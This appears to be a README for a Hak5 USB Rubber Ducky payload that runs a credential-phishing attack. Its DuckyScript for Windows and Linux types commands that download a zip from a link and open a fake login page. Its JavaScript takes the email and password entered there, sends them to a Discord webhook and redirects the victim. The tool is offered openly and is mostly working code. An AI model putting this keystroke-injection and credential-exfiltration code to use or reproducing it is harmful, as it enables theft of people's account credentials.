# Standard Phishing Campaign

A script used to exfiltrate the Standard username and password by a phishing campaign.

**Category**: Phishing

## Description

A script used to exfiltrate the Standard username and password by a phishing campaign.

This DuckyScript code performs several actions related to downloading and unzipping a file from a specified link. The script creates a new random directory, downloads a zip file from the specified URL, and unzips it. It also opens a login page.

This payload was created and tested on Linux but since the HTML markup code and JavaScript language are cross platform it will certainly be usable on machines running Windows or MacOS as well. However, it is essential to modify the DuckyScript script appropriately according to the terminal emulator used (PowerShell for Windows, Shell MacOS for Macs) since the commands are often not the same. To make it easier to use below you can find the various tested configurations, at the moment it is not available for macOS because since I do not have one it cannot be tested and therefore I cannot give the certainty that it works, however I hope that in the Hak5 community there may be someone who can contribute to this payload by completing it with this missing part.

## Payload.txt config - Windows 10/11 - Tested on Windows 11

```DuckyScript
    DELAY 1000
    GUI r
    DELAY 1000
    STRING powershell
    ENTER
    DELAY 2000

    STRINGLN do { $dir_name = [IO.Path]::Combine([IO.Path]::GetTempPath(), [IO.Path]::GetRandomFileName()) } while (Test-Path $dir_name)
    DELAY 500
    STRINGLN New-Item -ItemType Directory -Path $dir_name -ErrorAction Stop
    DELAY 500
    STRINGLN Set-Location $dir_name -ErrorAction Stop
    DELAY 500
    STRINGLN Invoke-WebRequest -Uri "#ZIP_LINK" -OutFile file.zip
    DELAY 2000
    STRINGLN Expand-Archive file.zip
    DELAY 500
    STRINGLN Invoke-Item login.html
    DELAY 500
```

## Payload.txt config - Linux (Debian based) - Tested on Ubuntu 23.04

```DuckyScript
    DELAY 1000
    CTRL-ALT t
    DELAY 2000

    REM Actual script...
```

# Getting Started

## Dependencies

* Internet Connection
* You own ZIP link
* Discord webhook (or whatever you want to use for the exfiltration)
* Python
* 'ExecutionPolicy Bypass' if used in Windows 10/11

## Settings

* Set the Discord wehbook (or whatever you want) into the script.js file at line 3
```JavaScript
// SET YOUR DISCORD WEBHOOK or whatever you want to exfiltrate the data
const discord_webhook_url = "https://discord.com/api/webhooks/123/abc";
```

* Set the redirect link that you want to use when the payload is sent
```JavaScript
// DEFINE the redirect link preferred
window.location.href = "https://www.example.com";
```

* Set the ZIP link as described in the payload.txt
```DuckyScript
REM REQUIRED - Replace example.com/file.zip with your own ZIP link. The zip should contian the files ['login.html', 'script.js']
DEFINE #ZIP_LINK example.com/file.zip
```

## JavaScript/HTML Documentation

- This JavaScript code aims to send the credentials entered in an HTML form to a Discord Webhook or any other remote server. The code is written as an asynchronous function named **send_login()**, which is called when the user presses the login button in the HTML form.
```JavaScript
async function send_login() {
    // ...
}
```

- The first thing the code does is to set the **discord_webhook_url** constant to the Discord Webhook URL where the message containing the credentials will be sent. Then, the **email** and **password** values are retrieved from the form input fields using their **id** attributes.
```JavaScript
    // SET YOUR DISCORD WEBHOOK or whatever you want to exfiltrate the data
    const discord_webhook_url = "https://discord.com/api/webhooks/123/abc";

    // Retrieve data from POST form
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
```

- After that, a **message** variable is created by concatenating the **email** and **password** values. This message will be sent to the Discord Webhook.
```JavaScript
    // Create message content
    const message = "Email: " + email + " \n " + "Password: " + password;
```

- The **fetch()** method is used to send an HTTP POST request to the Discord Webhook URL. The request body is a JSON object that contains the **message** content. If the response status is **ok**, the user is redirected to the specified URL, which is set in the **window.location.href** property. Otherwise, a generic error is thrown.
```JavaScript
    // Send POST request to Discord webhook URL
    const response = await fetch(discord_webhook_url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: message })
    });
    if (response.ok) {
        // DEFINE the redirect link preferred
        window.location.href = "https://www.example.com";
    } else {
        // Otherwise, throw a generic error
        throw new Error('Generic error!');
```

- If an error occurs during the execution of the **fetch()** method, it will be caught by the **catch()** block and logged to the console using the **console.error()** method.
```JavaScript
    try{
        // ...
    } catch (error) {
        // Log any errors to the console
        console.error(error);
    }
```

- To use this code, you need to replace the **discord_webhook_url** constant with the actual Discord Webhook URL or the URL of any other remote server that you want to send the message to. You also need to ensure that the **id** attributes of the email and password input fields in the HTML form match the values used in the **getElementById()** method calls. Finally, you need to call the **send_login()** function when the user submits the form.
```HTML
    <form onsubmit="send_login(); return false;" method="post">
        <div class="form-group">
            <label for="email">Email:</label>
            <input type="email" class="form-control" id="email" placeholder="Insert your email">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" class="form-control" id="password" placeholder="Insert your password">
        </div>
        <button type="submit" class="btn btn-primary">Login</button>
    </form>
```

## DuckyScript Documentation

This DuckyScript code performs several actions related to downloading and unzipping a file from a specified link. The script creates a new random directory, downloads a zip file from the specified URL, and unzips it. It also opens a login page.

- First, the script creates a new random directory using the mktemp command and assigns its path to the dir_name variable. The DELAY command is used to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Create a random directory
    STRINGLN dir_name=$(mktemp -d)
    DELAY 500
```

- Next, the script sets a timer using the sleep command to delete the directory after 60 minutes (3600 seconds). The rm -rf command is used to remove the directory and its contents. The & character is used to run this command in the background, allowing the script to continue running. Another DELAY command is used to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Delete the directory after 60 minutes (3600 seconds)
    STRINGLN (sleep 3600 && rm -rf $dir_name) &
    DELAY 500
```

- The script then moves into the directory using the cd command and the dir_name variable. Another DELAY command is used to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Move into the directory
    STRINGLN cd $dir_name
    DELAY 500
```

- Next, the script downloads the zip file from the specified URL using the curl command. The LOk option is used to download the file and give it the same name as the original file. The #ZIP_LINK placeholder should be replaced with the actual URL of the zip file. Another DELAY command is used to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Download the zip from your own link
    STRINGLN curl -LOk "#ZIP_LINK"
    DELAY 500
```

- The script then unzips the downloaded file using the unzip command. The DELAY command is used again to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Unzip it
    STRINGLN unzip file.zip
    DELAY 500
```

- Finally, the script opens the login page using the xdg-open command and the login.html file. The exit command is used to terminate the script.
```DuckyScript
    REM Open the login page
    STRINGLN xdg-open login.html; exit;
```

## Credits

<h2 align="center"> Aleff :octocat: </h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://github.com/aleff-github">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
      </a>
      <br>Github
    </td>
    <td align="center" width="96">
      <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
      </a>
      <br>Linkedin
    </td>
  </tr>
</table>
</div>